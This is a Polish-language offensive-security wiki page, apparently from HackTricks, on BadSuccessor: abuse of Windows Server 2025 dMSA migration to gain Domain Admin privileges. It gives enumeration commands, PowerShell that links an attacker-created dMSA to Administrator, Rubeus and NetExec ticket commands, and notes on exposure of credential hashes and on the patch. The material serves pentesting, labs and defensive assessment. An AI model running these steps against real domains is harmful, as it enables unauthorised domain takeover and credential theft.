# BadSuccessor

{{#include ../../../banners/hacktricks-training.md}}

## Przegląd

**BadSuccessor** nadużywa przepływu migracji **delegated Managed Service Account** (**dMSA**) wprowadzonego w **Windows Server 2025**. dMSA może być powiązane ze starszym kontem przez **`msDS-ManagedAccountPrecededByLink`** i przenoszone przez stany migracji przechowywane w **`msDS-DelegatedMSAState`**. Jeśli atakujący może utworzyć dMSA w zapisywalnym OU i kontrolować te atrybuty, KDC może wystawiać bilety dla dMSA kontrolowanego przez atakującego z **authorization context** powiązanego konta.

W praktyce oznacza to, że użytkownik o niskich uprawnieniach, który ma tylko delegowane uprawnienia OU, może utworzyć nowe dMSA, wskazać na `Administrator`, zakończyć stan migracji, a następnie uzyskać TGT, którego PAC zawiera uprzywilejowane grupy, takie jak **Domain Admins**.

## Szczegóły migracji dMSA, które mają znaczenie

- dMSA to funkcja **Windows Server 2025**.
- `Start-ADServiceAccountMigration` ustawia migrację w stanie **started**.
- `Complete-ADServiceAccountMigration` ustawia migrację w stanie **completed**.
- `msDS-DelegatedMSAState = 1` oznacza rozpoczętą migrację.
- `msDS-DelegatedMSAState = 2` oznacza zakończoną migrację.
- Podczas legalnej migracji dMSA ma transparentnie zastąpić wycofywane konto, więc KDC/LSA zachowują dostęp, jaki poprzednie konto już miało.

Microsoft Learn zauważa również, że podczas migracji oryginalne konto jest powiązane z dMSA, a dMSA ma uzyskiwać dostęp do tego, do czego mógł uzyskać dostęp stary konto. To właśnie założenie bezpieczeństwa nadużywa BadSuccessor.

## Wymagania

1. Domena, w której **dMSA istnieje**, co oznacza obecność wsparcia **Windows Server 2025** po stronie AD.
2. Atakujący może **tworzyć** obiekty `msDS-DelegatedManagedServiceAccount` w jakimś OU albo ma równoważne szerokie uprawnienia do tworzenia obiektów potomnych w tym miejscu.
3. Atakujący może **zapisywać** odpowiednie atrybuty dMSA albo w pełni kontroluje właśnie utworzone dMSA.
4. Atakujący może żądać biletów Kerberos z kontekstu dołączonego do domeny albo z tunelu, który ma dostęp do LDAP/Kerberos.

### Praktyczne sprawdzenia

Najczystszym sygnałem dla operatora jest weryfikacja poziomu domeny/lasu i potwierdzenie, że środowisko już używa nowego stosu Server 2025:
```powershell
Get-ADDomain | Select Name,DomainMode
Get-ADForest | Select Name,ForestMode
```
Jeśli widzisz wartości takie jak `Windows2025Domain` i `Windows2025Forest`, traktuj **BadSuccessor / dMSA migration abuse** jako priorytetowy check.

Możesz też wyliczyć writable OUs delegowane do tworzenia dMSA za pomocą public tooling:
```powershell
.\Get-BadSuccessorOUPermissions.ps1
```

```bash
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor
```
## Przepływ abuse

1. Utwórz dMSA w OU, gdzie masz delegowane rights create-child.
2. Ustaw **`msDS-ManagedAccountPrecededByLink`** na DN uprzywilejowanego celu, takiego jak `CN=Administrator,CN=Users,DC=corp,DC=local`.
3. Ustaw **`msDS-DelegatedMSAState`** na `2`, aby oznaczyć migrację jako zakończoną.
4. Zażądaj TGT dla nowego dMSA i użyj zwróconego ticketu do dostępu do uprzywilejowanych services.

Przykład PowerShell:
```powershell
New-ADServiceAccount -Name attacker_dMSA -DNSHostName host.corp.local -Path "OU=Delegated,DC=corp,DC=local"
Set-ADServiceAccount attacker_dMSA -Add @{
msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=corp,DC=local"
}
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
Przykłady żądań ticketów / narzędzi operacyjnych:
```bash
Rubeus.exe asktgs /targetuser:attacker_dMSA$ /service:krbtgt/corp.local /dmsa /opsec /nowrap /ptt /ticket:<machine_tgt>
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor -o TARGET_OU='OU=Delegated,DC=corp,DC=local' DMSA_NAME=attacker TARGET_ACCOUNT=Administrator
```
## Dlaczego to jest czymś więcej niż privilege escalation

Podczas legalnej migracji Windows musi też użyć nowego dMSA do obsługi ticketów, które zostały wydane dla poprzedniego konta przed cutover. Dlatego materiał ticketowy związany z dMSA może zawierać **current** i **previous** klucze w przepływie **`KERB-DMSA-KEY-PACKAGE`**.

W przypadku fałszywej migracji kontrolowanej przez atakującego to zachowanie może zamienić BadSuccessor w:

- **Privilege escalation** przez dziedziczenie uprzywilejowanych SID-ów grup w PAC.
- **Credential material exposure** ponieważ obsługa previous-key może ujawnić materiał równoważny RC4/NT hash poprzednika w podatnych workflow.

To sprawia, że technika jest przydatna zarówno do bezpośredniego przejęcia domeny, jak i do dalszych operacji, takich jak pass-the-hash lub szerszy credential compromise.

## Uwagi o statusie patcha

Oryginalne zachowanie BadSuccessor to **nie tylko teoretyczny problem preview z 2025**. Microsoft przypisał mu **CVE-2025-53779** i opublikował security update w **sierpniu 2025**. Zachowaj ten atak w dokumentacji dla:

- **labs / CTFs / assume-breach exercises**
- **niezałatanych środowisk Windows Server 2025**
- **weryfikacji delegacji OU i ekspozycji dMSA podczas assessmentów**

Nie zakładaj, że domena Windows Server 2025 jest podatna tylko dlatego, że istnieje dMSA; zweryfikuj poziom patcha i testuj ostrożnie.

## Tools

- [Akamai BadSuccessor tooling](https://github.com/akamai/BadSuccessor)
- [SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
- [NetExec `badsuccessor` module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

## References

- [HTB: Eighteen](https://0xdf.gitlab.io/2026/04/11/htb-eighteen.html)
- [Akamai - BadSuccessor: Abusing dMSA to Escalate Privileges in Active Directory](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [Microsoft Learn - Delegated Managed Service Accounts overview](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview)
- [Microsoft Security Response Center - CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)

{{#include ../../../banners/hacktricks-training.md}}
